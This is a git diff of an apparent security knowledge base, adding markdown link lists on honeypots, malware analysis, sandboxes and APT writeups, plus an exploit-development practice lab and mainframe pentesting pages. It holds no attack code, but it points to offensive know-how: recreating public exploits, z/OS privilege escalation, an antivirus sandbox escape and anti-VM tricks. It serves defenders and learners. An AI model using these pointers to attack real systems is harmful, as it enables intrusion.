+  * Beeswarm is a honeypot project which provides easy configuration, deployment
+    and managment of honeypots. Beeswarm operates by deploying fake end-user
+    systems (clients) and services (honeypots). Beeswarm uses these systems to
+    provides IoC (Indication of Compromise) by observing the difference between
+    expected and actual traffic.
+  * [Github](https://github.com/honeynet/beeswarm)
+
+* [Honeywall Project](https://projects.honeynet.org/honeywall/)
+
+  * The goal of this page is to provide you the latest documentation, source
+    code, distribution, and information for the Honeynet Project's Honeywall
+    CDROM. The Honeywall CDROM is a bootable CD that installs onto a hard drive
+    and comes with all the tools and functionality for you to implement data
+    capture, control and analysis.
+
+* [PSHITT](https://github.com/regit/pshitt)
+
+  * pshitt (for Passwords of SSH Intruders Transferred to Text) is a lightweight
+    fake SSH server designed to collect authentication data sent by intruders.
+    It basically collects username and password used by SSH bruteforce software
+    and writes the extracted data to a file in JSON format. pshitt is written in
+    Python and use paramiko to implement the SSH layer.
+
+* [Omnivora](http://sourceforge.net/projects/omnivora/)
+
+  * Omnivora is a low-interaction honeypot for systems running Windows operating
+    systems and is implemented using Borland Delphi. It is primarily designed to
+    collect autonomous spreading malware.
+
+* [dionea](http://dionaea.carnivore.it/)
+
+  * dionaea intention is to trap malware exploiting vulnerabilities exposed by
+    services offerd to a network, the ultimate goal is gaining a copy of the
+    malware.
+
+* [Kippo](https://github.com/desaster/kippo)
+
+  * Kippo is a medium interaction SSH honeypot designed to log brute force
+    attacks and, most importantly, the entire shell interaction performed by the
+    attacker.
+
+* [Glastopf Project](http://glastopf.org/)
+
+  * Glastopf is a Honeypot which emulates thousands of vulnerabilities to gather
+    data from attacks targeting web applications. The principle behind it is
+    very simple: Reply the correct response to the attacker exploiting the web
+    application. The project has been kicked off by Lukas Rist in 2009 and the
+    results we are got during this time are very promising and are an incentive
+    to put even more effort in the development of this unique tool. Read the
+    tool description for further information. We are working together with
+    different people, organizations and institutions to get the best from the
+    collected data. Find out more about collaborating with the project.
+
+* [Amun](http://sourceforge.net/projects/amunhoney/)
+
+  * Amun is a low-interaction honeypot, like Nepenthes or Omnivora, designed to
+    capture autonomous spreading malware in an automated fashion. Amun is
+    written in Python and therefore allows easy integration of new features.
+
+* [PHP-ShockPot](https://github.com/leonjza/PHP-ShockPot)
+
+  * PHP-ShockPot is a small honeypot aimed at showing you the interesting
+    attempts made trying to exploit your host using the now famous "Shellshock"
+    (also known as bashbug) bug.
+
+* [Google Hack Honeypot GHH](http://ghh.sourceforge.net/)
+
+  * Google Hack Honeypot is the reaction to a new type of malicious web traffic:
+    search engine hackers. GHH is a Google Hack honeypot. It is designed to
+    provide reconaissance against attackers that use search engines as a hacking
+    tool against your resources. GHH implements honeypot theory to provide
+    additional security to your web presence. Google has developed a powerful
+    tool. The search engine that Google has implemented allows for searching on
+    an immense amount of information. The Google index has swelled past 8
+    billion pages [February 2005] and continues to grow daily. Mirroring the
+    growth of the Google index, the spread of web-based applications such as
+    message boards and remote administrative tools has resulted in an increase
+    in the number of misconfigured and vulnerable web apps available on the
+    Internet. These insecure tools, when combined with the power of a search
+    engine and index which Google provides, results in a convenient attack
+    vector for malicious users. GHH is a tool to combat this threat.
+
+* [iNetSim](http://www.inetsim.org/)
+
+  * INetSim is a software suite for simulating common internet services in a lab
+    environment, e.g. for analyzing the network behaviour of unknown malware
+    samples.
+
+* [Thug - Python low-interaction honeyclient](https://buffer.github.io/thug/)
+
+  * Thug is a Python low-interaction honeyclient aimed at mimicing the behavior
+    of a web browser in order to detect and emulate malicious contents.
+
+* [elastichoney](https://github.com/jordan-wright/elastichoney)0
+
+  * Elastichoney is a simple elasticsearch honeypot designed to catch attackers
+    exploiting RCE vulnerabilities in elasticsearch.
+
+* [romanHunter](http://sourceforge.net/projects/romanhunter/)
+
+  * romanHunter (router man Hunter) is a wireless honeypot or closer to a
+    sinkhole that will bait a cracker, capture the MAC address, reset the WIFI
+    password (effectively destroying their connection) and wait for the next
+    authorized connection. The password changes happen on a round robin basis
+    from entries in the password file (pw_list.txt).
+
+* [Wordpot](https://github.com/gbrindisi/wordpot)
+
+  * Wordpot is a Wordpress honeypot which detects probes for plugins, themes,
+    timthumb and other common files used to fingerprint a wordpress
+    installation.
+
+* [Honeyagent](https://bitbucket.org/fkie_cd_dare/honeyagent)
+
+  * HoneyAgent is a Java agent library that creates a Sandbox for Java
+    applications and applets. Therefore, it uses the JVMTI as well as the JNI to
+    intercept class loading and function calls. During runtime HoneyAgent traces
+    function calls from the analysed application. It is displayed which class
+    calles which function with which parameters. Reflected function calls are
+    translated to the original function names for simpler reading.
+
+* [HoneyBadger](https://bitbucket.org/LaNMaSteR53/honeybadger)
+
+  * A framework for targeted geolocation.
+
+* [Amun Honeypot](https://github.com/zeroq/amun)
+
+  * [Amun Honeypot Paper](https://ub-madoc.bib.uni-mannheim.de/2595/1/amunhoneypot2.pdf)
+
+* [phpmyadmin_honeypot](https://github.com/gfoss/phpmyadmin_honeypot)
+
+  * Probably one of the smallest and simplest web honeypots out there...
+
+* [Web Labyrinth](https://github.com/mayhemiclabs/weblabyrinth)
+
+  * A simple tool that creates a maze of bogus web pages to confuse web
+    scanners. It's main goal is to delay and occupy malicious scanners that scan
+    websites in order for incident handlers to detected and respond to them
+    before damage is done.
+
+* [Web Bug Server](http://sourceforge.net/p/adhd/wiki/Web%20Bug%20Server/)
+
+  * Easily embed a web bug inside word processing documents. These bugs are
+    hidden to the casual observer by using things like linked style sheets and 1
+    pixel images.
+
+* [Truman](http://www.secureworks.com/cyber-threat-intelligence/tools/truman/)
+
+  * Truman can be used to build a "sandnet", a tool for analyzing malware in an
+    environment that is isolated, yet provides a virtual Internet for the
+    malware to interact with. It runs on native hardware, therefore it is not
+    stymied by malware which can detect VMWare and other VMs. The major
+    stumbling block to not using VMs is the difficulty involved with repeatedly
+    imaging machines for re-use. Truman automates this process, leaving the
+    researcher with only minimal work to do in order to get an initial analysis
+    of a piece of malware. Truman consists of a Linux boot image (originally
+    based on Chas Tomlin's Windows Image Using Linux) and a collection of
+    scripts. Also provided is pmodump, a Perl-based tool to reconstruct the
+    virtual memory space of a process from a PhysicalMemory dump. With this tool
+    it is possible to circumvent most packers to perform strings analysis on the
+    dumped malware.
+
+* [Static Low-interaction Honeypots](http://www.frameloss.org/2014/07/12/static-low-interaction-honeypots/)
+
+### Tools
+
+* [DCEPT](https://github.com/secureworks/dcept)
+  * A tool for deploying and detecting use of Active Directory honeytokens
+* [Hflow2](https://projects.honeynet.org/hflow)
+  * Data Analysis System
+* [Tango Honeypot Intelligence](https://github.com/aplura/Tango)
+  * Honeypot Intelligence with Splunk
+
+### Presentations
+
+* [Honeypots for Active Defense - A Practical Guide to Deploying Honeynets Within the Enterprise - Greg Foss](http://www.irongeek.com/i.php?page=videos/centralohioinfosec2015/tech201-honeypots-for-active-defense-a-practical-guide-to-deploying-honeynets-within-the-enterprise-greg-foss)
+
+  * InfoSec analysts are all somewhat familiar with honeypots. When they are
+    given the proper attention, care and feeding, they produce invaluable
+    information. This intelligence has been primarily used by security
+    researchers and organizations with advanced defensive capabilities to study
+    their adversaries and learn from their actions. But what about the rest of
+    us? Honeypots are a lot of work to configure, maintain, and monitor -- how
+    can an organization that is not focused on research gain valuable
+    intelligence using honeypots and actively defend their network using the
+    data obtained? The answer is honeypots for active defense. There are
+    currently many open source security tool distributions that come pre-loaded
+    with honeypots among other useful tools, however the honeypot software is
+    often not deployed in an effective manner. This session will discuss
+    techniques to deploy honeypots in ways that will not overburden the security
+    team with massive logs to sift through and focuses on correlating active
+    threat data observed in the honeypot with the production environment. When
+    deploying honeypots effectively, this can give security analysts one
+    additional mechanism to tip them off to nefarious activity within their
+    network.
+
+* [Global Honeypot Trends - Elliot Brink](https://www.youtube.com/watch?v=rjd-r4WA0PU)
+
+  * Many of my computer systems are constantly compromised, attacked, hacked,
+    24/7. How do I know this? I've been allowing it. This presentation will
+    cover over one year of research running several vulnerable systems (or
+    honeypots) in multiple countries including the USA, mainland China, Russia
+    and others. We'll be taking a look at: a brief introduction to honeypots,
+    common attacker trends (both sophisticated and script kiddie), brief malware
+    analysis and the statistical analysis of attackers based on GeoIP. Are there
+    differences in attacks based on where a computer system is located? Let's
+    investigate this together! Beginners to the topic of honeypots fear not, the
+    basics will be covered.
+
+* [Security Onions and Honey Potz - Ethan Dodge - BSidesSLC2015](https://www.youtube.com/watch?v=1Jbm1zwiGTM)
+
+### Writeups
+
+* [Deploying Dionaea on a Raspberry Pi using MHN](https://github.com/threatstream/mhn/wiki/Deploying-Dionaea-on-a-Raspberry-Pi)
+* [Experimenting with Honeypots Using The Modern Honey Network](https://zeltser.com/modern-honey-network-experiments/)
+* [Building a Honeypot to Research Cyber-Attack Techniques](https://www.sussex.ac.uk/webteam/gateway/file.php?name=bell-proj.pdf&site=20)
+* [Lessons Learn from attacks on Kippo honeypots](https://isc.sans.edu/diary/Lessons+Learn+from+attacks+on+Kippo+honeypots/18935)
+* [An in-depth analysis of SSH attacks on Amazon EC2](https://blog.secdim.com/in-depth-analysis-of-ssh-attacks-on-amazon-ec2/)
+
+  * The research study investigates Secure Shell (SSH) attacks on Amazon EC2
+    cloud instances across different AWS zones by means of deploying Smart
+    Honeypot (SH). It provides an in-depth analysis of SSH attacks, SSH
+    intruders profile, and attempts to identify their tactics and purposes.
+
+### Papers
+
+* [Analysis of Attacks Using a Honeypot - Verlag Berlin Heidelberg 2011]()
+
+  * Abstract. A Honeypot is a software based security device, deployed to
+    attract hackers by displaying services and open ports which are potentially
+    vulnerable. While the attackers are diverted, t heir activities can then be
+    monitored and an a- lysed to identify current a ttack methods and trends. A
+    low - interaction Honeypot called Dion aea was chosen for this project
+    because it can simulate services while preventing an attacker from gaining
+    full control. Results were collected over the six week period of the
+    experiment. The logged information of the o b- served attacks was analysed
+    and compared with current vulnerabilities, the loc a- tions where the
+    attacks were originating from and the time of day at the orig i- nating
+    site. A profile of individual attackers can then be built to ga in an
+    insight into the current attack trends in order to improve network defences.
+
+* [POSTER: Dragging Attackers to Honeypots for Effective Analysis of Cyber Threats](http://www.aims-conference.org/2014/POSTER-Dragging_Attackers_to_Honeypots_for_Effective_Analysis_of_Cyber_Threats.pdf)
+* [Setting Honeytraps with Modsecurity - Adding fake hidden form fields](http://blog.spiderlabs.com/2014/06/setting-honeytraps-with-modsecurity-adding-fake-hidden-form-fields.html)
diff --git a/Draft/How_To_Suck_at_Information_Security.md b/source/How-To-Suck-at-Information-Security.md
similarity index 100%
rename from Draft/How_To_Suck_at_Information_Security.md
rename to source/How-To-Suck-at-Information-Security.md
diff --git a/Draft/Lab_for_exploit_dev-basic.md b/source/Lab-For-Exploit-Dev-Basic.md
old mode 100755
new mode 100644
similarity index 51%
rename from Draft/Lab_for_exploit_dev-basic.md
rename to source/Lab-For-Exploit-Dev-Basic.md
index 20d8e76..5485ad1
--- a/Draft/Lab_for_exploit_dev-basic.md
+++ b/source/Lab-For-Exploit-Dev-Basic.md
@@ -1,18 +1,24 @@
-Building a Lab to practice Exploit writing
+# Building a Lab to practice Exploit writing
 
+### Introduction
 
-
-So, this is a thing I found while doing some googling. If you wrote this, I owe you a lot of beer. I redacted the place/username as it was on a less than happy place.
+So, this is a thing I found while doing some googling. If you wrote this, I owe
+you a lot of beer. I redacted the place/username as it was on a less than happy
+place.
 
 This assumes you have an idea of ASM x86 and general exploitation methods.
 
-Idea with this setup, is that you have a VM of XP SP3 running with the following software and tools installed. You look up the exploits on exploit-db and recreate them.
+Idea with this setup, is that you have a VM of XP SP3 running with the following
+software and tools installed. You look up the exploits on exploit-db and
+recreate them.
 
+### Start here:
 
-Start here:
-I'm designing exploit lab based on WinXP SP3. As for now I have following vulnerabilities/apps:
+I'm designing exploit lab based on WinXP SP3. As for now I have following
+vulnerabilities/apps:
 
-1. Simple RET - Ability FTP Server (FTP) - [Writeup of Fuzzing + Exploit Dev](http://infamoussyn.com/2013/03/17/exploit-discovery-ability-ftp-server-2-34/)
+1. Simple RET - Ability FTP Server (FTP) -
+   [Writeup of Fuzzing + Exploit Dev](http://infamoussyn.com/2013/03/17/exploit-discovery-ability-ftp-server-2-34/)
 2. Simple RET - FreeFloat FTP (FTP)
 3. Simple RET (harder) - CesarFTP (FTP)
 4. Simple RET - Easy RM to MP3 Converter (.pls)
@@ -32,19 +38,18 @@ with following tools installed:
 3. OllyDBG+Plugins(SSEH+OllySnake+AdvancedOlly+OllyHeapVis+Virtual2Physical)
 4. C:\Windows\system32\findjmp2.exe
 5. Cygwin + perl + gdb + gcc...
-6. Python26 (for IDA) + PyDbg - https://code.google.com/p/pydbgr/wiki/HowToInstall
-6. Python27 (for ImmunityDebugger)+pyDbg
-7. lcc-win
-8. Wireshark
-9. Mantra on Chrome (MoC)
-10. Google-Chrome
-11. Microsoft Visual C++ 2008 Express
-12. Nasm
-13. metasploit
-14. Alpha3 (c:\Alpha3)
-15. IDA
-16. Sysinternals (c:\Windows\System32)
-17. Proxifier Edition
-18. Echo Mirage
-
-
+6. Python26 (for IDA) + PyDbg -
+   https://code.google.com/p/pydbgr/wiki/HowToInstall
+7. Python27 (for ImmunityDebugger)+pyDbg
+8. lcc-win
+9. Wireshark
+10. Mantra on Chrome (MoC)
+11. Google-Chrome
+12. Microsoft Visual C++ 2008 Express
+13. Nasm
+14. metasploit
+15. Alpha3 (c:\Alpha3)
+16. IDA
+17. Sysinternals (c:\Windows\System32)
+18. Proxifier Edition
+19. Echo Mirage
diff --git a/Draft/Mainframes.md b/source/Mainframes.md
old mode 100755
new mode 100644
similarity index 72%
rename from Draft/Mainframes.md
rename to source/Mainframes.md
index a1d3302..22eba20
--- a/Draft/Mainframes.md
+++ b/source/Mainframes.md
@@ -1,18 +1,19 @@
-## Mainframes
-
+# Mainframes
 
 ### ToC
-* [General](#general)
-
 
+* [General](#general)
 
+### General
 
---------
-### <a name="general"></a>General
 * [Mainframes - Mopeds and Mischief; A PenTesters Year in Review](http://www.irongeek.com/i.php?page=videos/derbycon4/t203-mainframes-mopeds-and-mischief-a-pentesters-year-in-review-tyler-wrightson)
 * [Privilege escalation on z/OSINT - ayoul3 github](https://github.com/ayoul3/Privesc)
-	* Some scripts to quickly escalate on z/OS given certain misconfigurations.
+
+  * Some scripts to quickly escalate on z/OS given certain misconfigurations.
+
 * [REX_Scripts](https://github.com/ayoul3/Rexx_scripts)
-	* A collection of interesting REXX scripts to ease the life a mainframe pentester
-* [Mainframes - Mopeds and Mischief; A PenTesters Year in Review](http://www.irongeek.com/i.php?page=videos/derbycon4/t203-mainframes-mopeds-and-mischief-a-pentesters-year-in-review-tyler-wrightson)
 
+  * A collection of interesting REXX scripts to ease the life a mainframe
+    pentester
+
+* [Mainframes - Mopeds and Mischief; A PenTesters Year in Review](http://www.irongeek.com/i.php?page=videos/derbycon4/t203-mainframes-mopeds-and-mischief-a-pentesters-year-in-review-tyler-wrightson)
diff --git a/source/Malware.md b/source/Malware.md
new file mode 100644
index 0000000..1ae02fa
--- /dev/null
+++ b/source/Malware.md
@@ -0,0 +1,779 @@
+## Malware
+
+### TOC
+
+* [General](#general)
+* [Tutorials](#tutorial)
+* [Writeups](#writeup)
+* [Malware Repositories](#repository)
+* [Mobile](#mobile)
+* [Anti-VM/Detecting VMs](#antivm)
+* [Tools](#tools)
+* [Static Analysis](#static)
+* [Dynamic Analysis](#dynamic)
+* [AV Evasion/Encoders/Packers](#packers)
+* [Papers](#papers)
+* [Talks](#talks)
+* [Other](#other)
+
+### Sort
+
+* sort tools
+* Add malicious document section
+* http://securityxploded.com/malware-analysis-training-reference.php
+* http://www.malwarearchaeology.com/mmf/
+* https://motherboard.vice.com/read/preserving-the-ancient-art-of-getting-pwned
+* http://www.exposedbotnets.com/?m=0
+* https://brycampbell.co.uk/new-blog/ https://archive.is/Nol3S Add
+* Stuxnet
+* Duqu
+* Flame
+* Itaduke
+* Packers _ mew _ ASPROTECT _ UPX _ FSG \* PESpin
+
+* [IcoScript: using webmail to control malware](https://www.virusbulletin.com/virusbulletin/2014/08/icoscript-using-webmail-control-malware)
+* [fastfluxanalysis](https://github.com/staaldraad/fastfluxanalysis)
+
+  * Scripts to detect Fast-Flux and DGA using DNS query responses
+
+* [Interesting Malware - No, I’m not kidding... by Marion Marschalek](https://www.youtube.com/watch?v=u2Ry9HTBbZI)
+* [rVMI - A New Paradigm For Full System Analysis](https://github.com/fireeye/rvmi)
+
+  * rVMI is a debugger on steroids. It leverages Virtual Machine Introspection
+    (VMI) and memory forensics to provide full system analysis. This means that
+    an analyst can inspect userspace processes, kernel drivers, and preboot
+    environments in a single tool. It was specifially designed for interactive
+    dynamic malware analysis. rVMI isolates itself from the malware by placing
+    its interactive debugging environment out of the virtual machine (VM) onto
+    the hypervisor-level. Through the use of VMI the analyst still has full
+    control of the VM, which allows her to pause the VM at any point in time and
+    to use typical debugging features such as breakpoints and watchpoints. In
+    addtion, rVMI provides access to the entire Rekall feature set, which
+    enables an analyst to inspect the kernel and its data structures with ease.
+
+* [PyTrigger: A System to Trigger & Extract User-Activated Malware Behavior](http://cs.gmu.edu/~astavrou/research/PyTrigger_ARES2013.pdf)
+
+  * Abstract: We introduce PyTrigger, a dynamic malware analy- sis system that
+    automatically exercises a malware binary extract- ing its behavioral profile
+    even when specific user activity or input is required. To accomplish this,
+    we developed a novel user activity record and playback framework and a new
+    behavior extraction approach. Unlike existing research, the activity
+    recording and playback includes the context of every object in addition to
+    traditional keyboard and mouse actions. The addition of the con- text makes
+    the playback more accurate and avoids dependenciesand pitfalls that come
+    with pure mouse and keyboard replay. Moreover, playback can become more
+    efficient by condensing common activities into a single action. After
+    playback, PyTrigger analyzes the system trace using a combination of
+    multiple states and behavior differencing to accurately extract the malware
+    behavior and user triggered behavior from the complete system trace log. We
+    present the algorithms, architecture and evaluate the PyTrigger prototype
+    using 3994 real malware samples. Results and analysis are presented showing
+    PyTrigger extracts additional behavior in 21% of the samples
+
+* [Windows’ PsSetLoadImageNotifyRoutine Callbacks: the Good, the Bad and the Unclear (Part 2)](https://breakingmalware.com/documentation/windows-pssetloadimagenotifyroutine-callbacks-good-bad-unclear-part-2/)
+
+##### To Do
+
+* Sort Tools
+* Clean up/organize
+
+### First Section
+
+* [Awesome Malware Analysis - Github Awesome List series](https://github.com/rshipp/awesome-malware-analysis)
+* [TIPS FOR REVERSE - ENGINEERING MALICIOUS CODE - Lenny Zeltser](https://zeltser.com/media/docs/reverse-engineering-malicious-code-tips.pdf)
+* [List of autorun keys / malware persistence Windows registry entries](https://www.peerlyst.com/posts/list-of-autorun-keys-malware-persistence-windows-registry-entries-benjamin-infosec)
+* [Computer Viruses In This Modern Age - alcopaul/brigada ocho 2014](http://spth.virii.lu/dc6/TEXTS/alcopaul/virus_alcopaul.txt)
+
+### Tutorials
+
+* [Reverse Engineering Malware 101 Material - Malware Unicorn](https://securedorg.github.io/RE101/)
+* [Malware Analysis Tutorials: a Reverse Engineering Approach - Dr Xiang Fu](https://fumalwareanalysis.blogspot.com/p/malware-analysis-tutorials-reverse.html)
+* [Malware Analysis Tutorials: a Reverse Engineering Approach](http://fumalwareanalysis.blogspot.com/p/malware-analysis-tutorials-reverse.html)
+* [Malware Analysis 101 - N00b to Ninja in 60 Minutes at CactusCon on April 4, 2014](https://www.slideshare.net/grecsl/malware-analysis-101-n00b-to-ninja-in-60-minutes-at-cactuscon-on-april-4-2014)
+* [Creating a Malware Sandbox in Seconds with Noriben.](http://www.ghettoforensics.com/2016/01/creating-malware-sandbox-in-seconds.html?m=1)
+* [Building a Home Lab to Become a Malware Hunter - A Beginner’s Guide](https://www.alienvault.com/blogs/security-essentials/building-a-home-lab-to-become-a-malware-hunter-a-beginners-guide)
+* [Cuckoo Sandbox Hardening(2013)](http://0xmalware.blogspot.com/2013/10/cuckoo-sandbox-hardening-virtualbox.html)
+* [Awesome Guide to building a VM for anonymous Malware Analysis and Reverse Engineering](https://www.codeandsec.com/Building-Ultimate-Anonymous-Malware-Analysis-and-Reverse-Engineering-Machine)
+* [malboxes](https://github.com/GoSecure/malboxes)
+
+  * Builds malware analysis Windows VMs so that you don't have to.
+
+* [Advanced Desktop Application Sandboxing via AppContainer](https://www.malwaretech.com/2015/09/advanced-desktop-application-sandboxing.html)
+
+### Sandboxes
+
+* [Limon - Sandbox for Analyzing Linux Malwares](https://github.com/monnappa22/Limon)
+* [Truman](http://www.secureworks.com/cyber-threat-intelligence/tools/truman/)
+
+  * Truman can be used to build a "sandnet", a tool for analyzing malware in an
+    environment that is isolated, yet provides a virtual Internet for the
+    malware to interact with. It runs on native hardware, therefore it is not
+    stymied by malware which can detect VMWare and other VMs. The major
+    stumbling block to not using VMs is the difficulty involved with repeatedly
+    imaging machines for re-use. Truman automates this process, leaving the
+    researcher with only minimal work to do in order to get an initial analysis
+    of a piece of malware. Truman consists of a Linux boot image (originally
+    based on Chas Tomlin's Windows Image Using Linux) and a collection of
+    scripts. Also provided is pmodump, a Perl-based tool to reconstruct the
+    virtual memory space of a process from a PhysicalMemory dump. With this tool
+    it is possible to circumvent most packers to perform strings analysis on the
+    dumped malware. General Tutorials
+
+* [A Guide to Malware Binary Reconstruction](https://github.com/0xAX/linux-insides/blob/master/Misc/contribute.md)
+* [Automating Removal of JS Obfuscators](http://www.contextis.com/resources/blog/automating-removal-java-obfuscation/)
+
+  * In this post we detail a method to improve analysis of Java code for a
+    particular obfuscator, we document the process that was followed and
+    demonstrate the results of automating our method. Obscurity will not stop an
+    attacker and once the method is known, methodology can be developed to
+    automate the process.
+
+* [DIY Android Malware Analysis with OBAD](http://securityintelligence.com/diy-android-malware-analysis-taking-apart-obad-part-1/)
+* [ ZeroAccess Malware - Part 1 De-Obfuscating and Reversing the User-Mode Agent Dropper](http://resources.infosecinstitute.com/step-by-step-tutorial-on-reverse-engineering-malware-the-zeroaccessmaxsmiscer-crimeware-rootkit/)
+
+### General/Writeups
+
+* [Analyzing unknown malware blogpost series](http://thegoldenmessenger.blogspot.com/)
+
+### Android
+
+* [How To Dissect Android Flappy Bird Malware](http://securehoney.net/blog/how-to-dissect-android-flappy-bird-malware.html)
+* [Hacking Team Writeup](https://citizenlab.org/2014/06/backdoor-hacking-teams-tradecraft-android-implant/)
+* [Android/Beita.A malware analysis](http://www.jamesejr.com/android-beita-malware-analysis/)
+* [Android Sandbox V1](http://androidsandbox.net/)
+* [Cuckoo-Droid](https://github.com/i[danr1986/cuckoo-droid/blob/master/README.md)
+
+  * CuckooDroid is an extension of Cuckoo Sandbox the Open Source software for
+    automating analysis of suspicious files, CuckooDroid brigs to cuckoo the
+    capabilities of execution and analysis of android application.
+
+### Obfuscators
+
+* [ProGuard](http://proguard.sourceforge.net/)
+* [DexGuard](http://www.saikoa.com/dexguard)
+* [Obfuscation in Android malware, and how to fight back](https://www.virusbtn.com/virusbulletin/archive/2014/07/vb201407-Android-obfuscation)
+
+  [Obfuscation in Android Malware and how to fight back](https://www.virusbtn.com/virusbulletin/archive/2014/07/vb201407-Android-obfuscation)
+
+### De-Obfuscators
+
+* [De-hoser](https://github.com/strazzere/dehoser)
+
+  * Unpacker for the HoseDex2Jar APK Protection which packs the original file
+    inside the dex header
+
+* [hidex](https://github.com/cryptax/dextools/tree/master/hidex)
+
+  * Hides or reveals a given method in a DEX file
+
+* [Android Unpacker presented at Defcon 22: Android Hacker Protection Level 0](https://github.com/strazzere/android-unpacker)
+
+* Native-unpacker - Unpacker for APKProtect/Bangcle/LIAPP/Qihoo Packer that runs
+  natively, no dependency on gdb
+* hide-qemu
+
+  * Small hacks for hidingthe qemu/debuggers, specifically from APKProtect
+
+### Packers
+
+* [Android Packers](http://www.fortiguard.com/uploads/general/Area41Public.pdf)
+
+### APTs
+
+* [Clean up on Aisle APT - Mark Parsons](https://www.irongeek.com/i.php?page=videos/bsidescharm2017/bsidescharm-2017-t101-clean-up-on-aisle-apt-mark-parsons)
+
+  * This presentation will discuss findings from running multiple sinkholes over
+    the past year. I have purchased multiple domains associated with 'APT'
+    activity after the domains have expired. I will discuss initial expectations
+    before beginning this journey and then discuss actual results and findings.
+    To assist other researchers, suggestions and lessons learned from this
+    experiment will be shared.
+
+* [Decoding ZeuS disguised as an .RTF File](http://phishme.com/decoding-zeus-disguised-as-an-rtf-file/)
+
+  * Excellent step by step writeup
+
+* [FinFisher Malware Dropper Analysis](https://www.codeandsec.com/FinFisher-Malware-Dropper-Analysis)
+* [North Korean Malware Writeup](https://www.codeandsec.com/Supreme-Leaders-Not-That-Supreme-Malwares)
+* [Regin Malware writeup by F-Secure](https://www.f-secure.com/weblog/archives/00002774.html)
+* [Fanny Malware Writeup](https://securelist.com/blog/research/68787/a-fanny-equation-i-am-your-father-stuxnet/)
+* [The DUQU 2.0 Technical Details - Kaspersky](https://cdn.securelist.com/files/2015/06/The_Mystery_of_Duqu_2_0_a_sophisticated_cyberespionage_actor_returns.pdf)
+* [Unmasking Careto through Memory Analysis - Andrew Case](http://2014.video.sector.ca/video/110388398)
+  [Hacking FinSpy - a Case Study - Atilla Marosi - [TROOPERS15]](https://www.youtube.com/watch?v=Mb4mfBi06K4)
+* FinFisher - CodeandSec
+
+  * [Part 1](https://www.codeandsec.com/FinFisher-Malware-Dropper-Analysis)
+  * [Part 2](https://www.codeandsec.com/FinFisher-Malware-Analysis-Part-2)
+  * [Part 3](https://www.codeandsec.com/FinFisher-Malware-Analysis-Part-3)
+
+* [To Catch a Spy Tyler Hudak - Derbycon7](https://www.youtube.com/watch?v=usyCWf3gsQ4)
+* [ZitMo NoM - Derbycon2014](https://www.irongeek.com/i.php?page=videos/derbycon4/t520-zitmo-nom-david-schwartzberg)
+
+  * A world without malware is ideal but unlikely. Many of us would prefer
+    \*not\* to install another layer of protection on their already resource
+    constrained handheld mobile device. Alternatively, Android malware detection
+    sans anti-virus installation has become a reality. Learn about how it’s
+    possible to detect mobile malware using simple text messages with ZitMo NoM.
+    ZeuS in the mobile, known as ZitMo, is infamous for intercepting SMS
+    transmissions then redirecting them to a Command & Control in order steal
+    banking and personal information. Research with SMS transmissions directed
+    at mobile malware has resulted in the ability to detect ZitMo’s presence
+    without anti,virus applications installed. Turning their own tools against
+    them makes this even more of a rewarding endeavor. We are looking for
+    malware researchers to contribute to the continued development of this open
+    tool. The presentation will include the research, the infrastructure and a
+    demonstration of ZitMo NoM. Live malware will be used during this
+    presentation, assuming we get it to behave.
+
+* [Malware: From your text editor, to the United States Government's Lab (SHA2017)](https://www.youtube.com/watch?v=PtufumVvN-E)
+
+  * How Universities in the US collaborate with the United States Government to
+    make America stronger, and the rest weaker. Ever wonder where your malware
+    ends up after you deploy it? Are you curious how the United States
+    Government researches Cyber Security on the backs of students? First, this
+    is not a technical talk. This is an informative talk on the insides of how
+    the inner workings of an Information Security Lab in one of the Top
+    Technical Universities in the United States works with its Government to
+    provide insights in the world of, as the feds like to call it,
+    "CyberSecurity". (All Americans apologize for Trump. We're sorry.)
+
+* [Keep Calm and (Don’t) Enable Macros: A New Threat Actor Targets UAE Dissidents](https://citizenlab.org/2016/05/stealth-falcon/)
+
+  * Axiom Threat Actor Group Report
+  * [Executive Summary](http://www.novetta.com/files/9714/1446/8199/Executive_Summary-Final_1.pdf)
+
+### AV
+
+* [Escaping The Avast Sandbox Using A Single IOCTL](https://www.nettitude.co.uk/escaping-avast-sandbox-using-single-ioctl-cve-2016-4025)
+* [AVLeak: Fingerprinting Antivirus Emulators Through Black-Box Testing](https://www.usenix.org/system/files/conference/woot16/woot16-paper-blackthorne_update.pdf)
+
+### Botnets
+
+* [Case study of the miner botnet](http://pnx.tf/files/2012_cycon-official_miner_plohmann_padilla.pdf)
+* [Analysis of a Romanian Botnet](http://www.politoinc.com/2015/04/analysis-of-a-romanian-botnet/)
+
+  * Going from first sighting in logs to tracing attackers to their C2 IRC room
+
+* [A timeline of mobile botnets](https://www.virusbtn.com/virusbulletin/archive/2015/03/vb201503-mobile-botnets)
+
+  * With the recent explosion in smartphone usage, malware authors have
+    increasingly focused their attention on mobile devices, leading to a steep
+    rise in mobile malware over the past couple of years. In this paper, Ruchna
+    Nigam focuses on mobile botnets, drawing up an inventory of types of known
+    mobile bot variants.
+
+### C2 Infrastructure
+
+* [Dead RATs: Exploiting malware C2 servers](https://samvartaka.github.io/exploitation/2016/06/03/dead-rats-exploiting-malware)
+* [Hiding in Plain Sight: Advances in malware covert communication channels - BH2015 Pierre-Marc Bureau, Christian Dietrich](https://www.blackhat.com/docs/eu-15/materials/eu-15-Bureau-Hiding-In-Plain-Sight-Advances-In-Malware-Covert-Communication-Channels-wp.pdf)
+
+### Dynamic Analysis
+
+* [Unicorn VS. Malware](https://r3v3rs3r.wordpress.com/2015/12/12/unicorn-vs-malware/)
+* [Dynamic Anti-Emulation using Blackbox Analysis by Second Part To Hell](http://spth.virii.lu/dynamic_anti_emulation.txt)
+
+### Tools
+
+* [DRAKVUF](https://tklengyel.github.io/drakvuf/)
+
+  * DRAKVUF is an agentless dynamic malware analysis system built on Xen,
+    LibVMI, Volatility and Rekall. It allows for in-depth execution tracing of
+    malware samples and extracting deleted files from memory, all without having
+    to install any special software within the virtual machine used for
+    analysis.
+  * [Code](https://github.com/tklengyel/drakvuf)
+
+* [Zero Wine](http://zerowine.sourceforge.net/)
+
+  * Zero wine is an open source (GPL v2) research project to dynamically analyze
+    the behavior of malware. Zero wine just runs the malware using WINE in a
+    safe virtual sandbox (in an isolated environment) collecting information
+    about the APIs called by the program.
+
+* [Honeyagent](https://bitbucket.org/fkie_cd_dare/honeyagent)
+
+  * HoneyAgent is a Java agent library that creates a Sandbox for Java
+    applications and applets. Therefore, it uses the JVMTI as well as the JNI to
+    intercept class loading and function calls. During runtime HoneyAgent traces
+    function calls from the analysed application. It is displayed which class
+    calles which function with which parameters. Reflected function calls are
+    translated to the origin function names for simpler reading.
+
